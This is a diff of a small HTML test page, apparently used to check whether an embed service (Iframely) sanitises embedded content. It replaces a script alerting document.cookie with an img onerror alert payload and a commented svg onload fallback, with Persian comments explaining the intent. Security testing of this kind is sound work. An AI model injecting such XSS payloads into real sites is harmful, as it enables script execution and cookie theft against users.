@@ -1,6 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Payload Test</title>
+</head>
 <body>
-<script>alert('XSS - ' + document.cookie)</script>
+    <h1>Iframely Embed Payload Test</h1>
+    <p>This content is served as an embeddable resource.</p>
+    <!-- پیلود XSS: اگر بدون پاک‌سازی رندر شود، alert اجرا می‌شود -->
+    <img src="x" onerror="alert('Iframely-XSS-Payload-Executed')" />
+    
+    <!-- پیلود جایگزین برای تست در صورت مسدود شدن img onerror -->
+    <!-- <svg onload="alert('Iframely-XSS-SVG')"></svg> -->
 </body>
 </html>
